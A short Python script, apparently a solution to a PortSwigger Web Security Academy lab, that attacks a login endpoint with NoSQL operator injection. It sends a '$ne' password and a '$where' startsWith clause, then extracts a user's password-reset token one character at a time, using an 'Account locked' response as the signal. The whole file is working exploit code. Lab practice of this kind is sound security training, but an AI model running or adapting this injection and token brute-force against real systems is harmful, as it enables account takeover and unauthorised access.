import requests
from string import ascii_lowercase, ascii_uppercase, digits, printable, ascii_letters

url = "https://0a15004f0451f37c81c643f700f80022.web-security-academy.net/login"

data_json = {
    "username": "carlos",
    "password": {"$ne":"hello"},
}

token = "adda411ff"
init_token = token

while True:
    for c in "_-/:;-~>!#@<" + ascii_letters + digits:
        attempt = token + c
        # data_json["resetToken"] = {"$regex": attempt + ".*"}
        data_json["$where"] = f"this.resetToken.startsWith('{attempt}')"
        res = requests.post(url, json=data_json, allow_redirects=False)

        if "Account locked" in res.text:
            token += c
            print(token)
            break
    
    if token == init_token:
        break

